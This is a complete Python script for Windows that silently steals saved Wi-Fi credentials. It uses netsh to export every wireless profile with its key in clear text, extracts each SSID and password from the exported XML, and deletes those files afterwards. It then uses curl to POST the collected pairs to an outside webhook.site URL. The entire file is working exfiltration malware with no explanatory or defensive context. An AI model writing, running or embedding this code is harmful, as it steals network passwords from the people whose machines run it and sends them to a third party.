import subprocess
import os

url = "https://webhook.site/8ccec680-192e-4976-9c79-93d9ab5c5945"

wifi_files = []
wifi_names = []
wifi_passwords = []

INFO = ""

subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True)

path = os.getcwd()

for filename in os.listdir(path):
	if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
		wifi_files.append(filename)

for name in wifi_files:
	with open(name, 'r') as f:
		for line in f.readlines()[3:]:
			if "name" in line:
				stripped = line.strip()
				SSID = stripped[6:-7]
				wifi_names.append(SSID)
			if "keyMaterial" in line:
				stripped = line.strip()
				PASS = stripped[13:-14]
				wifi_passwords.append(PASS)
	os.remove(name)

for x, y in zip(wifi_names, wifi_passwords):
	INFO += "SSID: " + x.ljust(28, "-") + "PASS: " + y + "\n"

subprocess.run(["curl", "-X", "POST", "-H", "Content-Type: text/plain", "-d", INFO, "--url", url])
